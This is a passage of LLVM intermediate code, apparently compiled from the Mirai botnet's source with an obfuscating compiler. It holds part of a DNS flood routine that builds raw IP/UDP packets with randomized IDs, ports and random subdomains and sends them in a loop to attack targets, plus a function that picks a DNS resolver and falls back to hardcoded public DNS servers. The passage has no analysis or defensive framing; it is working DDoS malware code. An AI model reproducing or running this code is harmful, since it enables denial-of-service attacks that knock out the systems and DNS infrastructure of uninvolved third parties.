  %135 = getelementptr inbounds [256 x i8*], [256 x i8*]* @attack_udp_dns.dns_array, i64 0, i64 %134
  %136 = load i8*, i8** %135, align 8
  %137 = bitcast i8* %136 to %struct.iphdr*
  %138 = getelementptr inbounds i8, i8* %136, i64 20
  %139 = getelementptr inbounds i8, i8* %136, i64 28
  %140 = getelementptr inbounds i8, i8* %136, i64 41
  br i1 %51, label %141, label %146

; <label>:141:                                    ; preds = %.lr.ph
  %142 = call i32 @rand_next() #7
  %143 = trunc i32 %142 to i16
  %144 = getelementptr inbounds i8, i8* %136, i64 4
  %145 = bitcast i8* %144 to i16*
  store i16 %143, i16* %145, align 4
  br label %146

; <label>:146:                                    ; preds = %141, %.lr.ph
  br i1 %53, label %147, label %151

; <label>:147:                                    ; preds = %146
  %148 = call i32 @rand_next() #7
  %149 = trunc i32 %148 to i16
  %150 = bitcast i8* %138 to i16*
  store i16 %149, i16* %150, align 2
  br label %151

; <label>:151:                                    ; preds = %147, %146
  br i1 %55, label %152, label %157

; <label>:152:                                    ; preds = %151
  %153 = call i32 @rand_next() #7
  %154 = trunc i32 %153 to i16
  %155 = getelementptr inbounds i8, i8* %136, i64 22
  %156 = bitcast i8* %155 to i16*
  store i16 %154, i16* %156, align 2
  br label %157

; <label>:157:                                    ; preds = %152, %151
  br i1 %57, label %158, label %162

; <label>:158:                                    ; preds = %157
  %159 = call i32 @rand_next() #7
  %160 = trunc i32 %159 to i16
  %161 = bitcast i8* %139 to i16*
  store i16 %160, i16* %161, align 2
  br label %162

; <label>:162:                                    ; preds = %158, %157
  %163 = call i32 (i8*, i32, ...) bitcast (i32 (...)* @rand_alphastr to i32 (i8*, i32, ...)*)(i8* %140, i32 %58) #7
  %164 = getelementptr inbounds i8, i8* %136, i64 10
  %165 = bitcast i8* %164 to i16*
  store i16 0, i16* %165, align 2
  %166 = bitcast i8* %136 to i16*
  %167 = call zeroext i16 @checksum_generic(i16* %166, i32 20) #7
  store i16 %167, i16* %165, align 2
  %168 = getelementptr inbounds i8, i8* %136, i64 26
  %169 = bitcast i8* %168 to i16*
  store i16 0, i16* %169, align 2
  %170 = getelementptr inbounds i8, i8* %136, i64 24
  %171 = bitcast i8* %170 to i16*
  %172 = load i16, i16* %171, align 2
  %173 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %137, i8* %138, i16 zeroext %172, i32 %61) #7
  store i16 %173, i16* %169, align 2
  %174 = load i32, i32* %5, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %175, i32 0, i32 2, i32 0
  store i32 %23, i32* %176, align 4
  %177 = getelementptr inbounds i8, i8* %136, i64 22
  %178 = bitcast i8* %177 to i16*
  %179 = load i16, i16* %178, align 2
  %180 = load i32, i32* %5, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %181, i32 0, i32 1
  store i16 %179, i16* %182, align 2
  %183 = sext i32 %180 to i64
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %183, i32 0
  %185 = bitcast %struct.sockaddr_in* %184 to %struct.sockaddr*
  %186 = call i64 @sendto(i32 %27, i8* %136, i64 %63, i32 16384, %struct.sockaddr* %185, i32 16) #7
  %187 = load i32, i32* %5, align 4
  %188 = add nsw i32 %187, 1
  store i32 %188, i32* %5, align 4
  %189 = icmp slt i32 %188, %33
  br i1 %189, label %.lr.ph, label %.loopexit.loopexit

; <label>:190:                                    ; preds = %25, %4, %47
  ret void

; <label>:191:                                    ; preds = %.lr.ph126.1131
  %192 = add i8 %.1, 1
  br label %196

; <label>:193:                                    ; preds = %.lr.ph126.1131
  store i8 %.1, i8* %.1118, align 1
  %194 = getelementptr inbounds i8, i8* %105, i64 %indvars.iv.next
  %195 = getelementptr inbounds i8, i8* %194, i64 1
  br label %196

; <label>:196:                                    ; preds = %193, %191
  %.1118.1 = phi i8* [ %195, %193 ], [ %.1118, %191 ]
  %.1.1 = phi i8 [ 0, %193 ], [ %192, %191 ]
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next.1, %wide.trip.count
  br i1 %exitcond.1, label %._crit_edge.loopexit.unr-lcssa, label %.lr.ph126
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @get_dns_resolver() unnamed_addr #0 {
  %1 = alloca [2048 x i8], align 16
  %2 = alloca [32 x i8], align 16
  tail call void @table_unlock_val(i8 zeroext 46) #7
  %3 = tail call i8* @table_retrieve_val(i32 46, i32* null) #7
  %4 = tail call i32 (i8*, i32, ...) @open(i8* %3, i32 0) #7
  tail call void @table_lock_val(i8 zeroext 46) #7
  %5 = icmp sgt i32 %4, -1
  br i1 %5, label %6, label %.loopexit

; <label>:6:                                      ; preds = %0
  %7 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 0
  %8 = call i64 @read(i32 %4, i8* nonnull %7, i64 2048) #7
  %9 = trunc i64 %8 to i32
  %10 = tail call i32 @close(i32 %4) #7
  tail call void @table_unlock_val(i8 zeroext 47) #7
  %11 = tail call i8* @table_retrieve_val(i32 47, i32* null) #7
  %12 = call i32 @util_stristr(i8* nonnull %7, i32 %9, i8* %11) #7
  call void @table_lock_val(i8 zeroext 47) #7
  %13 = icmp ne i32 %12, -1
  %14 = icmp slt i32 %12, %9
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.loopexit

.lr.ph:                                           ; preds = %6
  %.old = add nsw i32 %9, -1
  %15 = add nsw i32 %9, -1
  %16 = sext i32 %12 to i64
  %sext = shl i64 %8, 32
  %17 = ashr exact i64 %sext, 32
  br label %18

; <label>:18:                                     ; preds = %.lr.ph, %39
  %indvars.iv = phi i64 [ %16, %.lr.ph ], [ %indvars.iv.next, %39 ]
  %.02633 = phi i8 [ 0, %.lr.ph ], [ %.2, %39 ]
  %19 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 %indvars.iv
  %20 = load i8, i8* %19, align 1
  %21 = icmp eq i8 %.02633, 0
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %18
  switch i8 %20, label %23 [
    i8 32, label %39
    i8 9, label %39
  ]

; <label>:23:                                     ; preds = %22, %18
  %.1 = phi i8 [ %.02633, %18 ], [ 1, %22 ]
  %24 = icmp eq i8 %20, 46
  br i1 %24, label %29, label %25

; <label>:25:                                     ; preds = %23
  %.off = add i8 %20, -48
  %26 = icmp ugt i8 %.off, 9
  %27 = trunc i64 %indvars.iv to i32
  %28 = icmp eq i32 %27, %15
  %or.cond29 = or i1 %28, %26
  br i1 %or.cond29, label %.critedge, label %39

; <label>:29:                                     ; preds = %23
  %30 = trunc i64 %indvars.iv to i32
  %.old28 = icmp eq i32 %30, %.old
  br i1 %.old28, label %.critedge, label %39

.critedge:                                        ; preds = %29, %25
  %31 = trunc i64 %indvars.iv to i32
  %32 = getelementptr inbounds [32 x i8], [32 x i8]* %2, i64 0, i64 0
  %33 = sext i32 %12 to i64
  %34 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 %33
  %35 = sub nsw i32 %31, %12
  call void @util_memcpy(i8* nonnull %32, i8* %34, i32 %35) #7
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [32 x i8], [32 x i8]* %2, i64 0, i64 %36
  store i8 0, i8* %37, align 1
  %38 = call i32 @inet_addr(i8* nonnull %32) #7
  br label %51

; <label>:39:                                     ; preds = %25, %22, %22, %29
  %.2 = phi i8 [ %.1, %29 ], [ 0, %22 ], [ 0, %22 ], [ %.1, %25 ]
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %40 = icmp slt i64 %indvars.iv.next, %17
  br i1 %40, label %18, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %39
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %6, %0
  %41 = call i32 @rand_next() #7
  %trunc = trunc i32 %41 to i2
  switch i2 %trunc, label %50 [
    i2 0, label %42
    i2 1, label %44
    i2 -2, label %46
    i2 -1, label %48
  ]

; <label>:42:                                     ; preds = %.loopexit
  %43 = call i32 @htonl(i32 134744072) #8
  br label %51

; <label>:44:                                     ; preds = %.loopexit
  %45 = call i32 @htonl(i32 1246898730) #8
  br label %51

; <label>:46:                                     ; preds = %.loopexit
  %47 = call i32 @htonl(i32 1074151430) #8
  br label %51

; <label>:48:                                     ; preds = %.loopexit
  %49 = call i32 @htonl(i32 67240450) #8
  br label %51

; <label>:50:                                     ; preds = %.loopexit
  unreachable

; <label>:51:                                     ; preds = %48, %46, %44, %42, %.critedge
  %.0 = phi i32 [ %38, %.critedge ], [ %49, %48 ], [ %47, %46 ], [ %45, %44 ], [ %43, %42 ]
  ret i32 %.0
}

declare i32 @rand_alphastr(...) local_unnamed_addr #3

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #3

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #3

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { nounwind }
attributes #8 = { nounwind readnone }
attributes #9 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146846634}
!2 = !{i32 -2146846225}
